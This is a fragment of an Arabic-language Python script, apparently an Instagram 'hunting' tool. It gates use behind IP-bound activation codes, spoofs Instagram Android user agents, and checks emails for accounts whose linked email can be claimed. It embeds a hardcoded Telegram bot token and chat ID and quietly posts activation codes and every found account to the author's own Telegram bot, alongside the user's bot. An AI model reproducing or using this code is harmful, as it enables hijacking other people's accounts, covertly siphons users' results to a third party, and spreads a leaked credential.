...
if user_ip is None:
    ...
    exit()
soso = input(f'{Y}ادخل كود التفعيل للدخول للأداه : ')
os.system('clear')
if soso in content:
		if soso=='':
			print(f'{R}يجب علي ادخال الكود')
			exit()
		else:
			mark_code_as_used(soso, user_ip)
			print(f'{G}الكود صحيح مرحبا بك')
elif is_code_used_by_another_user(soso, user_ip):
    
    print(f'{R}{soso}')
    print(f'{R}هذا الكود تم استخدامه من قبل مستخدم آخر.')
else:
    print(soso)
...
K = '\033[1;35;40m'
V = '\033[1;36;40m'
tok1 = '7239857970:AAHxST9MGJkDkaqbGmj8rIOlW_FW6MZZyfs'
iD1 = '1761998181'
...
شغل اداتك
كود تفعيل :-  {soso}
tg://openmessage?user_id={iD}""";requests.post(f"https://api.telegram.org/bot{tok1}/sendMessage?chat_id={iD1}&text={E}")
...
def insta2(email):
	...
	try:
		rnd=str(random.randint(150, 999))
		user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "INFINIX", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
...
def hunting(email):	
    ...
    'ig_sig_key_version': '4',
		...
		try:
			...
			name = None
		date = date_sc(Id)			
		requests.post(f"""https://api.telegram.org/bot{tok}/sendvideo?chat_id={iD}&parse_mode=MarkdownV2&video=https://t.me/sssssssssssssssss3/2&caption=*• لاتنسى ذكر الله
• واذكر ربك إذا نسيت*
""");hunt = ("""
تعال صدتلك حساب
⋘━─━@YYA_HH━─━⋙ 
...
𝙗𝙮 : @Bypass_vip
		...
		requests.post(f"https://api.telegram.org/bot{tok1}/sendMessage?chat_id={iD1}&text="+str(hunt))
		print(nnn)				
		hunt2 = ("""
تعال صدتلك حساب
Name : {}
...
def check_email(email):
	...
	bo = f'\x1b[38;5;{b}m'
	check+=1
	sys.stdout.write(f"\r   {bo}[{C}@YYA_HH{bo}] {C}Good Hot : {F}{good_hot}  {C}Bad IG : {R}{bad_ig}  {C}Good IG : {X}{good_ig}  {C}{bo}Check•{check}\r")
	sys.stdout.flush()
